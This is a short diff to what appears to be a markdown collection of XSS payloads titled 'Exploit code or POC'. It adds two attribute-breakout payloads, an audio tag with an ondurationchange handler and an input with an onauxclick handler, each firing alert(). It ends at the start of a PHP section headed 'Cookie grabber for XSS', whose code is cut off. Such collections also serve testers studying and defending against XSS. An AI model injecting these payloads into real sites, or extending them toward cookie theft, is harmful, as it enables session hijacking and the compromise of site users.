@@ -1,4 +1,20 @@
 # Exploit code or POC
+
+## Found by me! 
+
+
+Audio 
+
+```
+"><audio controls ondurationchange=alert(1)><source src=http://commondatastorage.googleapis.com/codeskulptor-demos/DDR_assets/Sevish_-__nbsp_.mp3 type=audio/mpeg></audio>
+```
+
+AuxClick
+
+```
+"><input onauxclick=alert(document.domain)>
+```
+
 ## Cookie grabber for XSS
 ```
 <?php
